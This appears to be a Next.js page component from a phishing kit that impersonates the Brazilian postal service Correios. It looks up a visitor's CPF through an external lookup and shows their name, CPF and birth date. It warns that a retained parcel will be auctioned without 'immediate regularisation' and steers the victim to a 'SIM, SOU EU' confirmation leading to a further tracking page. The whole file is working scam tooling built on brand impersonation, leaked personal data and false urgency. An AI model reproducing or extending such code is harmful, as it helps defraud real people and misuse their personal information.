"use client"

import { Button } from "@/components/ui/button"
import Image from "next/image"
import Link from "next/link"
import { useEffect, useState } from "react"
import { consultarCPF } from "@/lib/cpf-api"
import { Package } from "lucide-react"
import { trackPageView, trackUserConfirmation } from "@/components/google-analytics"

interface ClientData {
  cpf: string
  nome: string
  data_nascimento: string
  status: string
  encomenda: {
    codigo: string
    status: string
    produto: string
    valor: string
  }
}

interface ClientResultPageProps {
  cpfId: string
}

export default function ClientResultPage({ cpfId }: ClientResultPageProps) {
  const [clientData, setClientData] = useState<ClientData | null>(null)
  const [loading, setLoading] = useState(true)

  useEffect(() => {
    const findClientData = async () => {
      try {
        const result = await consultarCPF(cpfId)

        if (result.success && result.data) {
          setClientData(result.data)
        } else {
          setClientData(null)
        }
      } catch (error) {
        console.error("Erro ao buscar cliente:", error)
        setClientData(null)
      } finally {
        setLoading(false)
      }
    }

    findClientData()
  }, [cpfId])

  useEffect(() => {
    trackPageView("Página de Resultado CPF")
  }, [])

  // Função para formatar data de nascimento
  const formatDate = (dateString: string) => {
    if (!dateString) return ""
    const date = new Date(dateString)
    return date.toLocaleDateString("pt-BR")
  }

  const handleSimSouEuClick = () => {
    trackUserConfirmation()
  }

  if (loading) {
    return (
      <div className="min-h-screen flex flex-col bg-white">
        <header className="bg-white border-b border-gray-200 py-2 px-4">
          <div className="max-w-7xl mx-auto">
            <div className="flex justify-between items-center">
              <div className="text-xs">
                <Link href="#" className="text-blue-600 hover:underline">
                  Acessibilidade
                </Link>
              </div>
            </div>
            <div className="flex items-center mt-2">
              <Image src="/correios-logo.png" alt="Correios" width={120} height={40} className="h-8 w-auto" priority />
            </div>
          </div>
        </header>

        <main className="flex-grow bg-gray-100 flex items-center justify-center">
          <div className="text-center">
            <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-blue-500 mx-auto mb-4"></div>
            <p>Carregando dados do cliente...</p>
          </div>
        </main>
      </div>
    )
  }

  if (!clientData) {
    return (
      <div className="min-h-screen flex flex-col bg-white">
        <header className="bg-white border-b border-gray-200 py-2 px-4">
          <div className="max-w-7xl mx-auto">
            <div className="flex justify-between items-center">
              <div className="text-xs">
                <Link href="#" className="text-blue-600 hover:underline">
                  Acessibilidade
                </Link>
              </div>
            </div>
            <div className="flex items-center mt-2">
              <Image src="/correios-logo.png" alt="Correios" width={120} height={40} className="h-8 w-auto" priority />
            </div>
          </div>
        </header>

        <main className="flex-grow bg-gray-100 flex items-center justify-center">
          <div className="max-w-md mx-auto px-4 py-8 text-center">
            <h1 className="text-2xl font-bold text-blue-800 mb-4">CPF não encontrado</h1>
            <p className="text-gray-600 mb-6">
              O CPF informado não foi encontrado em nossa base de dados ou não possui encomendas pendentes.
            </p>
            <Link href="/" className="bg-blue-500 hover:bg-blue-600 text-white px-6 py-2 rounded-md">
              Voltar para a página inicial
            </Link>
          </div>
        </main>
      </div>
    )
  }

  return (
    <div className="min-h-screen flex flex-col bg-white">
      {/* Header */}
      <header className="bg-white border-b border-gray-200 py-2 px-4">
        <div className="max-w-7xl mx-auto">
          <div className="flex justify-between items-center">
            <div className="text-xs">
              <Link href="#" className="text-blue-600 hover:underline">
                Acessibilidade
              </Link>
            </div>
          </div>
          <div className="flex items-center mt-2">
            <Image src="/correios-logo.png" alt="Correios" width={120} height={40} className="h-8 w-auto" priority />
          </div>
        </div>
      </header>

      {/* Breadcrumb */}
      <div className="bg-white px-4 py-2 border-b border-gray-200">
        <div className="max-w-7xl mx-auto">
          <nav className="text-sm text-blue-600">
            <Link href="/" className="hover:underline">
              Portal Correios
            </Link>{" "}
            {">"} Rastreamento
          </nav>
        </div>
      </div>

      <main className="flex-grow bg-gray-100 py-8">
        <div className="max-w-4xl mx-auto px-4">
          {/* Card Principal */}
          <div className="bg-white rounded-lg shadow-lg border border-gray-200 p-8 mb-8">
            <div className="text-center">
              {/* Ícone do Pacote */}
              <div className="flex justify-center mb-6">
                <Package className="h-12 w-12 text-blue-600" />
              </div>

              {/* Título Principal */}
              <h1 className="text-2xl sm:text-3xl font-bold text-blue-600 mb-6">
                📦 Encontramos seu pedido retido em uma de nossas agências.
              </h1>

              {/* Texto de Aviso */}
              <p className="text-red-600 font-medium mb-8 text-lg">
                Após esse termo de ciência, sua mercadoria será encaminhada para o leilão dos correios
                <br />
                caso não ocorra regularização imediata.
              </p>

              {/* Dados do Cliente */}
              <div className="space-y-4 mb-8 text-left max-w-md mx-auto">
                <div className="text-lg">
                  <span className="font-normal">Nome: </span>
                  <span className="font-bold">{clientData.nome.toUpperCase()}</span>
                </div>
                <div className="text-lg">
                  <span className="font-normal">CPF: </span>
                  <span className="font-bold">{clientData.cpf}</span>
                </div>
                <div className="text-lg">
                  <span className="font-normal">Data de Nascimento: </span>
                  <span className="font-bold">{formatDate(clientData.data_nascimento)}</span>
                </div>
              </div>

              {/* Botões */}
              <div className="flex flex-col sm:flex-row gap-4 justify-center items-center">
                <Link href="/" className="order-2 sm:order-1">
                  <Button
                    variant="destructive"
                    className="bg-red-500 hover:bg-red-600 text-white px-8 py-3 text-lg font-medium"
                  >
                    Não, sou eu
                  </Button>
                </Link>
                <Link href={`/rastreamento?id=${cpfId}`} className="order-1 sm:order-2">
                  <Button
                    className="bg-blue-500 hover:bg-blue-600 text-white px-8 py-3 text-lg font-medium"
                    onClick={handleSimSouEuClick}
                  >
                    SIM, SOU EU
                  </Button>
                </Link>
              </div>
            </div>
          </div>
        </div>
      </main>

      {/* Footer */}
      <footer className="bg-yellow-400 py-6">
        <div className="max-w-6xl mx-auto px-4 text-center">
          <p className="text-sm font-medium text-gray-800">Central de Atendimento: 0800 725 0100</p>
        </div>
      </footer>
    </div>
  )
}
